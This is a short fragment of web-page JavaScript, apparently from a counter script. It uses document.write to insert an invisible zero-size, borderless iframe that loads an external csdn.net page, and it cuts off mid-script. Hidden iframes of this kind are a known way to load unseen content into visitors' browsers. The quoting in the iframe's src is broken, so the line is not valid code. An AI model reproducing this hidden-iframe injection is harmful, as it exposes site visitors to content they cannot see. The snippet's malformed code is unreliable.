...
document.write("<iframe id=myframe name=myframe frameborder=no scrolling=no width=0 height=0 border=0 src=http://blog.csdn.net/"http://www.csdn.net/ggmm/dd333.htm\"></iframe>");
	if(cnt_debug){
		document.write('<br>');
